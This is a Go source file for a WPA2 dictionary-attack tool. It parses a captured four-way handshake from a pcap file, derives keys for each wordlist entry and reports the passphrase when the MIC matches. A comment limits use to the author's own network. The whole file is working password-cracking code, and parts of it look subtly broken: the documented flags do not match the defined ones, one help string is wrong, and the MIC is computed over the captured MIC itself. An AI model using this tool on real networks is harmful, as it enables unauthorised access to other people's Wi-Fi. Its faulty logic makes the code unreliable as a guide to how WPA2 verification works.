// get wpa keys via recorded 4-way handshake. This bin requires that the 4-way
// handshake is in an isolated pcap file using Wireshark.
// Example:
// go run brute --ssid SSID -f PATH_TO_PCAP_FILE -w PATH_TO_WORDLIST -v

// do not use to attack anything that you do not have permission for.
// i use this script to test my own network, and it was fun learning how
// to manually get this going using golang

package main

import (
	"bufio"
	"bytes"
	"crypto/hmac"
	"crypto/sha1"
	"flag"
	"fmt"
	"log"
	"os"
	"strings"

	"github.com/ealvar3z/brute/pkg"
	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

func main() {
	// flags
	var _pcap string
	var ssidStr string
	var wordlist string
	flag.StringVar(&ssidStr, "s", "", "how many lines to read from the file")
	flag.StringVar(&wordlist, "w", "", "file path of wordlist to use")
	flag.StringVar(&_pcap, "p", "", "file path of pcap file")
	verboseFlag := flag.Bool("v", false, "verbose mode")
	flag.Parse()
	pkg.VerboseMode = *verboseFlag

	if len(strings.TrimSpace(ssidStr)) == 0 {
		fmt.Println("Provide an SSID: -s <SSID>")
		os.Exit(1)
	}
	pkg.SSID = []byte(ssidStr)

	// packet capture
	pcapFile := _pcap
	handle, err := pcap.OpenOffline(pcapFile)
	if err != nil {
		fmt.Printf("%s\n", err)
		return
	}

	// parse wordlist file
	file, err := os.Open(wordlist)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	s := bufio.NewScanner(file)
	if err := s.Err(); err != nil {
		log.Fatal(err)
	}

	packetSrc := gopacket.NewPacketSource(handle, handle.LinkType())

	// first packet
	packet, err := packetSrc.NextPacket()
	if err != nil {
		panic("Failed getting the first packet!")
	}
	pkg.FirstMsgHandler(packet)

	// second packet
	packet, err = packetSrc.NextPacket()
	if err != nil {
		panic("Failed getting the second packet!")
	}
	pkg.SecondMsgHandler(packet)

	// third packet
	packet, err = packetSrc.NextPacket()
	if err != nil {
		panic("Failed getting the third packet!")
	}
	pkg.ThirdMsgHandler(packet)

	// fourth packet
	packet, err = packetSrc.NextPacket()
	if err != nil {
		panic("Failed getting the fourth packet!")
	}
	pkg.FourthMsgHandler(packet)

	for s.Scan() {
		pw := s.Text()
		pmk := pkg.GeneratePMK(pw)
		b := pkg.GenerateB([]byte(pkg.APMac), []byte(pkg.ClientMac), pkg.ANonce, pkg.SNonce)
		ptk := pkg.PRFX(pmk, []byte("Pairwise key expansion"), b, 512)

		if pkg.VerboseMode {
			fmt.Printf("ANonce: %x \n", pkg.ANonce)
			fmt.Printf("SNonce: %x \n", pkg.SNonce)
			fmt.Printf("AP MAC Addr: %x\n", []byte(pkg.APMac))
			fmt.Printf("Client MAC Addr: %x\n", []byte(pkg.ClientMac))
			fmt.Println()
			fmt.Println("Password", pw)
			fmt.Printf("PMK: %x\n", pmk)
			fmt.Printf("PTK: %x\n", ptk)
		}
		hmacHandler := sha1.New                // WPA2
		mac := hmac.New(hmacHandler, ptk[:16]) // KCK = first 16 bytes
		mac.Write(pkg.FirstMIC)
		mic := mac.Sum(nil)

		if bytes.Compare(mic[:16], pkg.FirstMIC) == 0 {
			fmt.Println("Correct Password:", pw)
			break
		}
	}
}
